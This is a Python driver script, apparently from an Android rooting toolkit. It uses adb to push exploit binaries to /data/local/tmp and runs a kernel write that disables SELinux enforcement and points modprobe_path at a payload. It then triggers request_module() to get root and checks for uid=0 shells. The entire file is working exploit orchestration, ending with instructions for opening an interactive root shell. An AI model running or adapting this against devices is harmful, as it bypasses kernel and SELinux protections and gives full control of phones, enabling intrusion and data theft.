#!/usr/bin/env python3
"""Push everything, run the exploit, trigger the kernel payload, verify root.

    python deploy.py
    python deploy.py --serial <serial>
    ADB=/path/to/adb python deploy.py
"""
import argparse
import os
import re
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
D = "/data/local/tmp"
BINARIES = ["probe26", "trig_sock", "rootshell", "su"]


def adb(serial, *args, check=True, capture=False):
    cmd = [os.environ.get("ADB", "adb")]
    if serial:
        cmd += ["-s", serial]
    cmd += list(args)
    return subprocess.run(cmd, check=check, text=True, encoding="utf-8", errors="replace",
                          stdout=subprocess.PIPE if capture else None,
                          stderr=subprocess.STDOUT if capture else None)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--serial", default=os.environ.get("SERIAL", ""))
    args = ap.parse_args()

    bindir = os.path.join(ROOT, "bin")
    if not os.path.isfile(os.path.join(bindir, "probe26")):
        print("[*] building first")
        subprocess.run([sys.executable, os.path.join(ROOT, "build.py")], check=True)

    adb(args.serial, "wait-for-device")

    print("[*] pushing binaries")
    local = [os.path.join(bindir, b) for b in ["probe26", "trig_sock", "rootshell"]] + \
            [os.path.join(ROOT, "payload", "wb.sh")]
    adb(args.serial, "push", *local, D + "/", capture=True)
    # source su is pushed as .su.bin: /data is nosuid, the runnable copy lives on tmpfs
    adb(args.serial, "push", os.path.join(bindir, "su"), D + "/.su.bin", capture=True)
    adb(args.serial, "shell", "rm -f " + f"{D}/su")
    adb(args.serial, "shell", "chmod 755 " + " ".join(f"{D}/{x}" for x in ["probe26", "trig_sock", "rootshell", "wb.sh", ".su.bin"]))

    print("[*] step 1/3  kernel write (selinux_enforcing=0, modprobe_path=payload)")
    out = adb(args.serial, "shell", f"{D}/probe26 -p {D}/wb.sh -L {D}/probe26.log -y -q",
              capture=True, check=False).stdout or ""
    log = os.path.join(ROOT, ".last-run.log")
    with open(log, "w", encoding="utf-8") as f:
        f.write(out)
    for line in [l for l in out.splitlines() if l.strip()][-3:]:
        print("  " + line)
    if "result=OK" not in out:
        sys.exit("[!] exploit did not report success — see " + D + "/probe26.log, reboot and retry")

    print("[*] step 2/3  trigger request_module() -> root payload")
    adb(args.serial, "shell", f"{D}/trig_sock", check=False)
    time.sleep(1)

    print("[*] step 3/3  verify")
    enf = adb(args.serial, "shell", "getenforce", capture=True, check=False).stdout or ""
    su = adb(args.serial, "shell", f"{D}/.su/su -c id", capture=True, check=False).stdout or ""
    rs = adb(args.serial, "shell", f"{D}/rootshell id", capture=True, check=False).stdout or ""
    ok = (enf.strip() == "Permissive"
          and bool(re.search(r"uid=0", su)) and bool(re.search(r"uid=0", rs)))
    print("  getenforce:", enf.strip())
    print("  su -c id  :", su.strip().replace("\n", " | "))
    print("  rootshell :", rs.strip().replace("\n", " | "))

    if not ok:
        sys.exit("[!] root verification failed; see docs/TROUBLESHOOTING.md")

    print("\n[+] done.  interactive root shell:")
    print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell {D}/rootshell")
    print("    or su (it is NOT in PATH, nothing is written to /system):")
    print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell {D}/.su/su")
    print(f"      adb {('-s ' + args.serial + ' ') if args.serial else ''}shell 'export PATH={D}/.su:$PATH; su'")
    print("\n[!] per-boot only: reboot restores SELinux Enforcing and modprobe_path.")


if __name__ == "__main__":
    main()
